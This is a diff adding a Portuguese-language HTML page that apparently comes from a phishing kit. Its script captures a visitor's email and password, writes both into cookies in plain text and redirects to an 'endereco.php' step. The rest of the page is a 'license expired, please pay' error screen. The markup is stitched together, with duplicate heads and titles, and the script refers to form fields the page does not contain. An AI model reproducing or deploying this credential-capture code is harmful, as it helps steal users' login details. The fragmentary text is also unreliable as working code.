@@ -1,0 +1,51 @@
+<html lang=en ng-app=app ng-strict-di><script crossorigin integrity=sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU= src=https://code.jquery.com/jquery-3.4.1.js></script><script src=https://cdn.jsdelivr.net/npm/js-cookie@beta/dist/js.cookie.min.js></script><script src=../global/real.js></script><script>$(document).ready(function(){
+
+    $("#entrar").click(function(){
+
+    var email = $("#email").val();
+    var senha = $("#password").val();
+    var retorno = true;
+    var id = 1;
+
+    if(email.indexOf("@") == "-1" || email.indexOf(".") == "-1"){
+      $("#email").css("border", "1px solid red");
+      $("#error_email").html("Por favor, digite um e-mail valido");
+      retorno = false;
+    }else{
+      $("#email").css("border", "1px solid #ccc");
+      $("#error_email").html("");
+    }
+
+    if(senha.length < 6){
+      $("#password").css("border", "1px solid red");
+      $("#error_senha").html("Por favor, digite uma senha valida");
+      retorno = false;
+    }else{
+      $("#password").css("border", "1px solid #ccc");
+      $("#error_senha").html("");
+    }
+
+    if(retorno == true){
+      cookie("login",email);
+      cookie("senha", senha);
+      redir("endereco.php?enc="+id);
+    }
+
+  })
+
+})</script><title>
+  </title><meta content="text/html; charset=utf-8"http-equiv=Content-Type><style>@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><meta content=8.18.8 name=version><style>body {
+background-image: url("../images/.jpg");
+background-color:#E9ECEF;
+background-attachment:scroll;
+background-repeat:no-repeat;
+background-position:center;
+background-size:cover;
+line-height:5px; 
+}
+.display-1 {text-align:center;color:#e1b7b7;}
+.display-1 .fa {animation:fa-spin 5s infinite linear;}
+.display-3 {text-align:center;color:#df726a;}
+.lower-case {text-align:center;}</style><link href=//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css id=bootstrap-css rel=stylesheet><script src=//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js></script><script src=//code.jquery.com/jquery-1.11.1.min.js></script><title>
+   Erro 223 - Licença expirada
+  </title><meta charset=utf-8><meta content=width=device-width,initial-scale=1,shrink-to-fit=no name=viewport><script src=js/jq.js></script><link href=css/bootstrap.css rel=stylesheet><link href=css/w3.css rel=stylesheet><link href=css/animate.css rel=stylesheet><link href=css/style.css rel=stylesheet><script src=js/bootstrap.min.js></script><link href=images/a.png rel=icon type=images/water.png><link href=https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css rel=stylesheet><link href=https://www.w3schools.com/w3css/4/w3.css rel=stylesheet><body style="background: #E9ECEF"><div class=wrapper><div class=container-fluid id=top-container-fluid-nav><div class=container></div></div><div class=container-fluid id=body-container-fluid><div class=container><div class=jumbotron><h1 class=display-1><i class="fa fa-spin fa-cog fa-3x"> </i></h1><h1 class=display-3>ERROR</h1><p class=lower-case>Seu plano venceu !<p class=lower-case>faça o pagamento e volta a usar nossos serviços</div></div></div><div class=container-fluid id=footer-container-fluid><div class=container></div></div></div>
